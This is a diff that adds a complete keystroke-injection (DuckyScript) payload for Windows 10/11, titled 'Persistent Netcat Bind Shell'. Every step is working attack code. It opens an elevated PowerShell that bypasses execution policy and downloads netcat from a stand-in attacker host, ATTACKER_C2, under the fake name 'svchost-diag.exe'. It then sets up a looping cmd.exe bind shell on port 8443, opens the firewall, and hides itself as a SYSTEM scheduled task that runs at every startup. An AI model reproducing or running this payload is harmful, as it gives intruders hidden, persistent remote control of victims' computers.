@@ -1,0 +1,87 @@
+REM ==========================================
+REM Title: Persistent Netcat Bind Shell
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Downloads a portable netcat
+REM   binary, sets up a persistent bind shell
+REM   listener on a high port, and creates a
+REM   firewall rule to allow inbound access.
+REM   Persists across reboots via schtasks.
+REM Category: Command & Control / Persistence
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Set bind port
+STRING $bindPort = 8443
+ENTER
+DELAY 350
+REM Create hidden tools directory
+STRING $toolDir = "$env:ProgramData\Microsoft\Diagnostics"; New-Item -ItemType Directory -Path $toolDir -Force | Out-Null
+ENTER
+DELAY 400
+REM Download portable ncat (from attacker server or nmap bundle)
+STRING $ncUrl = 'https://ATTACKER_C2/tools/nc.exe'
+ENTER
+DELAY 350
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+ENTER
+DELAY 350
+STRING try { Invoke-WebRequest -Uri $ncUrl -OutFile "$toolDir\svchost-diag.exe" -UseBasicParsing } catch { Write-Host 'Download failed' }
+ENTER
+DELAY 1000
+REM Create wrapper batch script for persistent listener
+STRING $batContent = @"
+ENTER
+DELAY 300
+STRING @echo off
+ENTER
+DELAY 300
+STRING :loop
+ENTER
+DELAY 300
+STRING $toolDir\svchost-diag.exe -l -p $bindPort -e cmd.exe
+ENTER
+DELAY 300
+STRING timeout /t 10 /nobreak >nul
+ENTER
+DELAY 300
+STRING goto loop
+ENTER
+DELAY 300
+STRING "@
+ENTER
+DELAY 350
+STRING $batContent | Out-File "$toolDir\diagsvc.bat" -Encoding ASCII -Force
+ENTER
+DELAY 400
+REM Add firewall rule for bind port
+STRING New-NetFirewallRule -DisplayName 'Diagnostics Service' -Direction Inbound -Protocol TCP -LocalPort $bindPort -Action Allow -Profile Any -ErrorAction SilentlyContinue
+ENTER
+DELAY 400
+REM Create scheduled task for persistence
+STRING $action = New-ScheduledTaskAction -Execute "$toolDir\diagsvc.bat"
+ENTER
+DELAY 350
+STRING $trigger = New-ScheduledTaskTrigger -AtStartup
+ENTER
+DELAY 350
+STRING $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+ENTER
+DELAY 350
+STRING Register-ScheduledTask -TaskName 'DiagnosticsService' -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM' -RunLevel Highest -Force
+ENTER
+DELAY 500
+REM Start the listener now
+STRING Start-Process -FilePath "$toolDir\diagsvc.bat" -WindowStyle Hidden
+ENTER
+DELAY 500
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
